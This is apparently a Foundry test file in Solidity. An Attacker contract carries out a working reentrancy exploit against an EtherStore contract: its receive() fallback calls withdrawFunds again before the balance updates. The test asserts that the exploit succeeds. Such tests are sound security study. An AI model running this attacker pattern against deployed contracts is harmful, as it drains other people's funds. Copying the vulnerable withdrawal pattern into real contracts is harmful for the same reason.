
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherStore} from "../src/EtherStore.sol";

contract TestReentrancyEtherStore is Test {
    EtherStore public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherStore();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= _contractUnderTest.withdrawalLimit());
        vm.assume(attackVal < type(uint128).max);

        vm.warp(block.timestamp + 1 weeks);

        _contractUnderTest.depositFunds{value: attackVal * 2}();

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherStore public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackValue;

    constructor(address victimAddress) {
        victim = EtherStore(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackValue = val;

        victim.depositFunds{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.withdrawFunds(val);

        if (attackCallCount == 2 && address(this).balance >= initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            victim.withdrawFunds(attackValue);
            attackCallCount++;
        }
    }
}
